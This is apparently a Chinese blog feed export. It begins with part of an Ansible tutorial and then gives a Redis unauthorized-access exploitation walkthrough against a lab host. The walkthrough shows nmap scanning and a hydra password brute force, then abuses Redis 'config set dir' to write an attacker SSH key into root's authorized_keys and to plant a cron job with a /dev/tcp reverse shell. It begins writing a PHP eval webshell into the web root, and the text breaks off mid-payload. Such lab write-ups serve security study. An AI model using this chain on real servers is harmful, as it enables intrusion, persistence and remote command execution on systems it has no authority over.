基本概念</h2><ul><li><strong>控制节点</strong>：运行Ansible命令的计算机。</li><li><strong>受管节点</strong>：被Ansible管理的计算机。</li><li><strong>清单（Inventory）</strong>：定义受管节点的列表，通常存储在<code>/etc/ansible/hosts</code>文件中。</li><li><strong>模块（Modules）</strong>：执行任务的单位，Ansible内置了许多模块用于不同的管理任务。</li><li><strong>剧本（Playbooks）</strong>：包含任务的YAML文件，用于定义一组配置或编排任务。</li><li><strong>角色（Roles）</strong>：用于组织和重用Ansible代码的层次结构。</li></ul><h2 id="3-配置清单文件"><a href="#3-配置清单文件" class="headerlink" title="3.配置清单文件"></a>3.配置清单文件</h2><p>编写 Ansible 的 <code>hosts</code> 文件定义受管节点（主机）。这个文件可以在 <code>/etc/ansible/hosts</code> 路径下找到</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 直接定义主机</span><br>green.example.com<br>blue.example.com<br>192.168.100.1<br>192.168.100.10<br><span class="hljs-comment"># 分组的主机</span><br><span class="hljs-section">[webservers]</span><br>alpha.example.org<br>beta.example.org<br><br><br><span class="hljs-comment"># 使用模式匹配来定义一组主机，例如 www[001:006].example.com 表示从 www001.example.com 到 www006.example.com 的主机</span><br><span class="hljs-comment"># 范围模式</span><br>www<span class="hljs-section">[001:006]</span>.example.com<br><br></code></pre></td></tr></table></figure><p> 可以为单个主机或整个组指定变量：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># 为单个主机指定变量</span><br>alpha.example.org <span class="hljs-attr">ansible_user</span>=admin ansible_port=<span class="hljs-number">2222</span><br><br><span class="hljs-comment"># 为整个组指定变量</span><br><span class="hljs-section">[webservers:vars]</span><br><span class="hljs-attr">ansible_user</span>=webadmin<br><span class="hljs-attr">ansible_port</span>=<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>为成功连接受控主机，需要配置ssh密钥</p><p>1.在控制节点生成 SSH 密钥对</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa -b 4096 -C &quot;your_email@example.com&quot;<br></code></pre></td></tr></table></figure><p>将会在 <code>~/.ssh</code> 目录下生成 <code>id_rsa</code>（私钥）和 <code>id_rsa.pub</code>（公钥）文件。</p><p>2.将公钥复制到目标主机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 连接受控主机并将控制节点的公钥写入authorized_keys</span><br>ssh root@alpha.example.org<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;您的公钥内容&gt;&quot;</span> &gt;&gt; ~/.ssh/authorized_keys <span class="hljs-comment"># 注意：用户名root 非root用户需要在上面的hosts文件中指定登录名</span><br></code></pre></td></tr></table></figure><h2 id="4-Ansible使用"><a href="#4-Ansible使用" class="headerlink" title="4.Ansible使用"></a>4.Ansible使用</h2><h4 id="列出所有主机"><a href="#列出所有主机" class="headerlink" title="列出所有主机"></a>列出所有主机</h4><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ada">列出所有在清单文件中定义的主机：<br>ansible <span class="hljs-keyword">all</span> <span class="hljs-comment">--list</span><br># 列出指定组中的主机：<br>ansible webservers <span class="hljs-comment">--list-hosts</span><br></code></pre></td></tr></table></figure><h4 id="Ping-所有主机"><a href="#Ping-所有主机" class="headerlink" title="Ping 所有主机"></a>Ping 所有主机</h4><p>使用 <code>ping</code> 模块测试所有主机的连通性：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">ansible <span class="hljs-keyword">all</span> -m ping<br></code></pre></td></tr></table></figure><h4 id="在主机上执行命令"><a href="#在主机上执行命令" class="headerlink" title="在主机上执行命令"></a>在主机上执行命令</h4><p>在指定的主机组上使用 <code>command</code> 模块执行命令（例如查看磁盘空间）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ansible webservers -m <span class="hljs-built_in">command</span> -a <span class="hljs-string">&quot;df -h&quot;</span><br></code></pre></td></tr></table></figure><h5 id="在主机上执行-Shell-命令"><a href="#在主机上执行-Shell-命令" class="headerlink" title="在主机上执行 Shell 命令"></a>在主机上执行 Shell 命令</h5><p>在指定的主机组上使用 <code>shell</code> 模块执行命令（例如列出 <code>/tmp</code> 目录）：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">ansible webservers -m <span class="hljs-built_in">shell</span> -<span class="hljs-keyword">a</span> <span class="hljs-string">&quot;ls -l /tmp&quot;</span><br></code></pre></td></tr></table></figure><h4 id="运行剧本"><a href="#运行剧本" class="headerlink" title="运行剧本"></a>运行剧本</h4><p>使用 <code>ansible-playbook</code> 命令运行剧本：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ansible-playbook playbook.yml<br></code></pre></td></tr></table></figure><h4 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h4><p>使用 <code>-b</code> 或 <code>--become</code> 提升权限（例如使用 <code>sudo</code>）：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible webservers -<span class="hljs-selector-tag">b</span> -m command -<span class="hljs-selector-tag">a</span> <span class="hljs-string">&quot;df -h&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Anisble-Modules-常用模块"><a href="#Anisble-Modules-常用模块" class="headerlink" title="Anisble Modules  常用模块"></a>Anisble Modules  常用模块</h3><p>ansible使用“模块”来完成大部分的任务。模块可以完成安装软件，复制文件，使用模板等功能。</p><table><thead><tr><th>模块</th><th>功能描述</th><th>示例</th></tr></thead><tbody><tr><td><code>ping</code></td><td>测试主机是否可达</td><td><code>ansible all -m ping</code></td></tr><tr><td><code>command</code></td><td>在远程主机上执行命令（不通过 shell）</td><td><code>ansible webservers -m command -a &quot;df -h&quot;</code></td></tr><tr><td><code>shell</code></td><td>在远程主机上执行 shell 命令</td><td><code>ansible webservers -m shell -a &quot;ls -l /tmp&quot;</code></td></tr><tr><td><code>raw</code></td><td>在远程主机上直接执行命令，不通过 Ansible 模块子系统</td><td><code>ansible all -m raw -a &quot;python --version&quot;</code></td></tr><tr><td><code>copy</code></td><td>将本地文件复制到远程主机</td><td><code>ansible webservers -m copy -a &quot;src=/path/to/local/file dest=/path/to/remote/file&quot;</code></td></tr><tr><td><code>fetch</code></td><td>从远程主机上提取文件</td><td><code>ansible webservers -m fetch -a &quot;src=/path/to/remote/file dest=/path/to/local/file&quot;</code></td></tr><tr><td><code>file</code></td><td>设置文件属性，如权限、所有权等</td><td><code>ansible webservers -m file -a &quot;path=/path/to/file mode=0644&quot;</code></td></tr><tr><td><code>service</code></td><td>管理服务，如启动、停止、重启等</td><td><code>ansible webservers -m service -a &quot;name=nginx state=started&quot;</code></td></tr><tr><td><code>apt</code></td><td>使用 apt 包管理器安装软件包（适用于 Debian 系系统）</td><td><code>ansible webservers -m apt -a &quot;name=nginx state=present&quot;</code></td></tr><tr><td><code>yum</code></td><td>使用 yum 包管理器安装软件包（适用于 Red Hat 系系统）</td><td><code>ansible webservers -m yum -a &quot;name=httpd state=present&quot;</code></td></tr><tr><td><code>user</code></td><td>管理用户和组</td><td><code>ansible webservers -m user -a &quot;name=johndoe state=present&quot;</code></td></tr><tr><td><code>group</code></td><td>管理组</td><td><code>ansible webservers -m group -a &quot;name=admin state=present&quot;</code></td></tr><tr><td><code>cron</code></td><td>管理 cron 作业</td><td><code>ansible webservers -m cron -a &quot;name=&#39;backup&#39; minute=&#39;0&#39; hour=&#39;2&#39; job=&#39;/path/to/backup.sh&#39;&quot;</code></td></tr><tr><td><code>get_url</code></td><td>从 URL 下载文件</td><td><code>ansible webservers -m get_url -a &quot;url=http://example.com/file dest=/tmp/file&quot;</code></td></tr><tr><td><code>setup</code></td><td>收集远程主机的详细信息</td><td><code>ansible all -m setup</code></td></tr><tr><td><code>template</code></td><td>使用 Jinja2 模板渲染文件并部署到远程主机</td><td><code>ansible webservers -m template -a &quot;src=/path/to/template.j2 dest=/path/to/remote/file&quot;</code></td></tr><tr><td><code>yum_repository</code></td><td>管理 YUM 仓库</td><td><code>ansible webservers -m yum_repository -a &quot;name=epel description=EPEL repo baseurl=https://download.fedoraproject.org/pub/epel/7/x86_64/&quot;</code></td></tr><tr><td><code>hostname</code></td><td>设置远程主机的主机名</td><td><code>ansible webservers -m hostname -a &quot;name=newhostname&quot;</code></td></tr><tr><td><code>git</code></td><td>管理 Git 仓库</td><td><code>ansible webservers -m git -a &quot;repo=https://github.com/example/repo.git dest=/path/to/repo&quot;</code></td></tr></tbody></table><h3 id="Ansible-playbook-用法"><a href="#Ansible-playbook-用法" class="headerlink" title="Ansible playbook 用法"></a>Ansible playbook 用法</h3><h4 id="Playbook-结构"><a href="#Playbook-结构" class="headerlink" title="Playbook 结构:"></a>Playbook 结构:</h4><p>一个 playbook 通常包含以下几个部分:</p><ul><li><strong>hosts:</strong> 指定要执行任务的目标主机或主机组。</li><li><strong>become:</strong> 指定是否以超级用户权限执行任务。</li><li><strong>vars:</strong> 定义 playbook 中使用的变量。</li><li><strong>tasks:</strong> 定义要执行的任务列表，每个任务使用模块来完成特定的操作。</li><li><strong>handlers:</strong> 定义 playbook 中事件的响应动作，例如在某个服务重启后执行特定操作。</li></ul><h4 id="Playbook-示例"><a href="#Playbook-示例" class="headerlink" title="Playbook 示例:"></a>Playbook 示例:</h4><p>以下是一个简单的 playbook 示例，用于安装 Nginx 并启动服务:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">web_servers</span><br>  <span class="hljs-attr">become:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">tasks:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Nginx</span><br>    <span class="hljs-attr">apt:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">state:</span> <span class="hljs-string">present</span><br><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Start</span> <span class="hljs-string">Nginx</span> <span class="hljs-string">service</span><br>    <span class="hljs-attr">service:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">nginx</span><br>      <span class="hljs-attr">state:</span> <span class="hljs-string">started</span><br></code></pre></td></tr></table></figure><p><strong>解释:</strong></p><ul><li>—: YAML 文件开头标识。</li><li>hosts: web_servers: 指定 playbook 应用的目标主机组为 web_servers。</li><li>become: true: 表示以超级用户权限执行任务。</li><li>tasks: 定义任务列表。</li><li>- name: Install Nginx: 任务名称，用于描述该任务的作用。</li><li>apt: 使用 apt 模块安装软件包。</li><li>name: nginx: 要安装的软件包名称为 nginx。</li><li>state: present: 确保软件包已安装。</li><li>- name: Start Nginx service: 启动 Nginx 服务。</li><li>service: 使用 service 模块管理服务。</li><li>name: nginx: 要管理的服务名称为 nginx。</li><li>state: started: 确保服务已启动。</li></ul><h4 id="运行-Playbook"><a href="#运行-Playbook" class="headerlink" title="运行 Playbook:"></a><strong>运行 Playbook:</strong></h4><p><strong>使用以下命令运行 playbook:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">ansible-playbook <span class="hljs-tag">&lt;<span class="hljs-name">playbook_name.yml</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>检查剧本的语法是否正确：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible-playbook playbook<span class="hljs-selector-class">.yml</span> <span class="hljs-attr">--syntax-check</span><br></code></pre></td></tr></table></figure><p><strong>查看剧本将会执行的操作，但不实际执行：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ansible-playbook playbook<span class="hljs-selector-class">.yml</span> <span class="hljs-attr">--check</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Ansible 是一款 IT 自动化工具。主要应用场景有配置系统、软件部署、持续发布及不停服平滑滚动更新的高级任务编排。&lt;/p&gt;
&lt;p&gt;Ansible 本身非常简单易用，同时注重安全和可靠性，以最小化变动为特色，使用 OpenSSH 实现数据传输 ( 如果有需要的话也可以使</summary>
      
    
    
    
    
    <category term="Ansible" scheme="http://example.com/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问漏洞</title>
    <link href="http://example.com/2024/05/21/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2024/05/21/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-05-21T11:38:29.000Z</published>
    <updated>2024-05-21T11:53:14.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h1><p>去<a href="http://download.redis.io/releases%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E7%89%88%E6%9C%AC%EF%BC%8C%E5%BB%BA%E8%AE%AE4.0.8">http://download.redis.io/releases选择一个版本，建议4.0.8</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /tmp<br>wget http://download.redis.io/releases/redis-7.2.4.tar.gz<br>tar -zvxf redis-7.2.4.tar.gz<br>mv /tmp/redis-7.2.4 /usr/local/redis<br>cd /usr/local/redis<br>make<br>make PREFIX=/usr/local/redis install<br><br>./bin/redis-server&amp; ./redis.conf<br></code></pre></td></tr></table></figure><h1 id="Redis未授权访问-漏洞复现"><a href="#Redis未授权访问-漏洞复现" class="headerlink" title="Redis未授权访问 漏洞复现"></a>Redis未授权访问 漏洞复现</h1><p><strong>一、漏洞描述</strong></p><p>漏洞成因： </p><p>1.Redis 绑定在默认的 6379 端，且没有配置访问控制策略，直接暴露在公网。攻击者可以通过扫描获 取 Redis 访问端口，从而攻击者未经授权也可以访问 Redis。 </p><p>2.未设置密码或者设置弱密码，允许远程登录访问 Redis 服务。攻击者可以直接或者通过密码爆破连 接到 Redis 并进行恶意操作。</p><ol start="3"><li>Redis 使用 root 权限启动。使得攻击者在成功入侵 Redis 服务后，利用 Redis 对服务器开展进一步 的攻击。</li></ol><p><strong>二、漏洞影响版本</strong></p><p>Redis 2.x–5.x</p><p>三、<strong>漏洞危害</strong></p><p>(1) 未授权的访问可能导致敏感信息泄露，攻击者也可以恶意执行命令来清空所有数据和破坏服务</p><p> (2) 如果 Redis 以 root 权限启动，攻击者可以在&#x2F;root&#x2F;.ssh 写入 SSH 公钥文件，直接通过 SSH 登录 目标服务器</p><p> (3) 攻击者可通过 Redis 数据备份功写入可以指定目录的特性，写入后面程序，结合计划任务或者 web 服务 getshell，执行恶意代码和攻击。p><p>当redis服务(6379)端口对外开放且未作密码认证时，任意用户可未授权访问redis服务并操作获取其数据。<br>攻击机：kali 192.168.198.134<br>目标靶机：centos 192.168.198.144</p><h2 id="1-端口扫描"><a href="#1-端口扫描" class="headerlink" title="1.端口扫描"></a>1.端口扫描</h2><p>首先在攻击机上使用nmap对目标机进行扫描，探测开放的服务与端口。<br>使用全端口扫描，探测存在的服务： </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p- -sV <span class="hljs-number">192.168.198.144</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">┌──(kali㉿kali)-[~/password]                                                                                                                                                               <br>└─$ nmap -p- -sV 192.168.198.144                                                                                                                                                           <br>Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-10 04:18 EDT                                                                                                                            <br>Nmap scan report for 192.168.198.144                                                                                                                                                       <br>Host is up (0.00066s latency).                                                                                                                                                             <br>Not shown: 65532 closed tcp ports (conn-refused)                                                                                                                                           <br>PORT      STATE SERVICE  VERSION                                                                                                                                                           <br>22/tcp    open  ssh      OpenSSH 7.4 (protocol 2.0)                                                                                                                                        <br>6379/tcp  open  redis    Redis key-value store 2.8.17                                                                                                                                      <br>10250/tcp open  ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API)                                                                                                         <br>                                                                                                                                                                                           <br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                             <br>Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds    <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510162400812.png" alt="image-20240510162400812"></p><h2 id="2-密码爆破"><a href="#2-密码爆破" class="headerlink" title="2.密码爆破"></a>2.密码爆破</h2><p>使用hydra进行密码爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">hydra  <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> redis -P <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/password/</span>top1000.txt -e ns  -f -o redis.txt<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ hydra  <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns  -f -o redis.txt                                                                                                 <br>Hydra v9<span class="hljs-number">.3</span> (c) <span class="hljs-number">2022</span> <span class="hljs-keyword">by</span> van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** ignore laws<br> <span class="hljs-keyword">and</span> ethics anyway).                                                                                                                                                                       <br>                                                                                                                                                                                           <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span>                                                                                                         <br>[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">1001</span> <span class="hljs-keyword">login</span> tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">1001</span>), ~<span class="hljs-number">63</span> tries per task                                                                                      <br>[DATA] attacking redis://<span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>:<span class="hljs-number">6379</span>/                                                                                                                                             <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared                                                                                                                                   <br>[STATUS] attack finished <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> (<span class="hljs-keyword">valid</span> pair <span class="hljs-built_in">found</span>)                                                                                                                            <br><span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> <span class="hljs-keyword">valid</span> <span class="hljs-keyword">password</span> <span class="hljs-built_in">found</span>                                                                                                                               <br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">23</span>                                                                                                         <br>                                                                                                                                                                                           <br>┌──(kali㉿kali)-[~/<span class="hljs-keyword">password</span>]                                                                                                                                                               <br>└─$ cat redis.txt                                                                                                                                                                          <br>                                                                                                                                                                                           <br># Hydra v9<span class="hljs-number">.3</span> run at <span class="hljs-number">2024</span><span class="hljs-number">-05</span><span class="hljs-number">-10</span> <span class="hljs-number">04</span>:<span class="hljs-number">36</span>:<span class="hljs-number">21</span> <span class="hljs-keyword">on</span> <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis (hydra -P /home/kali/<span class="hljs-keyword">password</span>/top1000.txt -e ns -f -o redis.txt <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span> redis)                                    <br>[<span class="hljs-number">6379</span>][redis] host: <span class="hljs-number">192.168</span><span class="hljs-number">.198</span><span class="hljs-number">.144</span>   <span class="hljs-keyword">password</span>: foobared   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510163642639.png" alt="image-20240510163642639"></p><p>得到密码foobared</p><h2 id="3-远程连接redis"><a href="#3-远程连接redis" class="headerlink" title="3.远程连接redis"></a>3.远程连接redis</h2><p>使用密码连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">192.168.198.144</span> -p <span class="hljs-number">6379</span> -a foobared<br></code></pre></td></tr></table></figure><p>连接成功</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(kali㉿kali)-<span class="hljs-string">[~/password]</span>                                                                                                                                                               <br>└─$ redis-cli -h <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">198</span>.<span class="hljs-number">144</span> -p <span class="hljs-number">6379</span> -a foobared                                                                                                                                       <br><span class="hljs-number">192.168.198.144:6379</span>&gt;    <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240510170005022.png" alt="image-20240510170005022"></p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="（1）写-ssh-keygen-公钥登录服务器"><a href="#（1）写-ssh-keygen-公钥登录服务器" class="headerlink" title="（1）写 ssh-keygen 公钥登录服务器"></a>（1）写 ssh-keygen 公钥登录服务器</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>ssh-keygen -t rsa<br><span class="hljs-meta prompt_"># </span><span class="language-bash">接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：</span><br>(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /root/.ssh/key.txt<br>cat /root/.ssh/key.txt | ./redis-cli  -h 192.168.198.144 -p 6379 -a foobared -x set pub<br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上</span><br>./redis-cli -h 192.168.198.144 -p 6379 -a foobared<br><span class="hljs-meta prompt_"># </span><span class="language-bash">设置工作目录为 /root/.ssh</span><br>config set dir /root/.ssh<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件 authorized_keys</span><br>config set dbfilename &quot;authorized_keys&quot;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">保存信息入文件</span><br>save<br><br>ssh -i  /root/.ssh/id_rsa root@192.168.198.144 <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511011752561.png" alt="image-20240511011752561"></p><p><img src="/img/course/image-20240511015012934.png" alt="image-20240511015012934"></p><h3 id="（2）利用-Redis-写入计划任务"><a href="#（2）利用-Redis-写入计划任务" class="headerlink" title="（2）利用 Redis 写入计划任务"></a>（2）利用 Redis 写入计划任务</h3><p>该攻击利用数据库的特性，通过以下步骤实现反弹 Shell：</p><ol><li><strong>数据插入：</strong> 将计划任务的内容作为数据值（value），并使用任意键值（key）将其插入数据库中。</li><li><strong>路径修改：</strong> 修改数据库的默认路径，使其指向目标主机上的计划任务路径。</li><li><strong>数据写入文件：</strong> 将数据库中的数据写入目标主机上的计划任务文件。</li></ol><p>通过以上步骤，攻击者可以在目标主机上成功写入一个计划任务，从而实现反弹 Shell。</p><p>在攻击机kali上开启监听：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">nc</span> <span class="hljs-string">-lvp</span> <span class="hljs-number">51888</span><br></code></pre></td></tr></table></figure><p>然后连接服务端的Redis，写入反弹shell的计划任务：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">./</span>redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h <span class="hljs-number">192.168</span>.<span class="hljs-number">198.144</span> <span class="hljs-operator">-</span>p <span class="hljs-number">6379</span> <span class="hljs-operator">-</span>a foobared<br><span class="hljs-keyword">set</span> cron <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.198.144/51888 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span><br>config <span class="hljs-keyword">set</span> dir <span class="hljs-regexp">/var/</span>spool<span class="hljs-operator">/</span>cron<br>config <span class="hljs-keyword">set</span> dbfilename root<br>save<br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511032133259.png" alt="image-20240511032133259"></p><p>经过一分钟以后，在攻击机的nc中成功反弹shell回来。</p><h3 id="（3）网站绝对路径写-webshell"><a href="#（3）网站绝对路径写-webshell" class="headerlink" title="（3）网站绝对路径写 webshell"></a>（3）网站绝对路径写 webshell</h3><p>对目标机器进行信息收集，看看端口是否开放了哪些</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -p- -T4 <span class="hljs-number">192.168.198.144</span><br>dirb http://192.168.198.144:80   <br></code></pre></td></tr></table></figure><p><img src="/img/course/image-20240511040341109.png" alt="image-20240511040341109"></p><p><strong>写入webshell</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">./redis-cli -h 192.168.198.144 -p 6379 -a foobared//连接redis</span><br><span class="language-xml">config set dir /var/www/html/ </span><br><span class="language-xml">set xxx &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span 